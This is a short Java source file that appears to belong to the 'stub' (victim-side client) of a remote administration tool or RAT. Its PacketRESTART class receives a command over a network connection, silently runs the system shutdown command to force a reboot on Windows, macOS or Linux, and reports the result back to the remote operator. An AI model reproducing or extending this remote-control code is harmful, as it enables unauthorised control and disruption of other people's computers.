package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Constants;
import com.redpois0n.common.OperatingSystem;

public class PacketRESTART extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -r");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
			Runtime.getRuntime().exec("shutdown -r now");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else {
			
			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
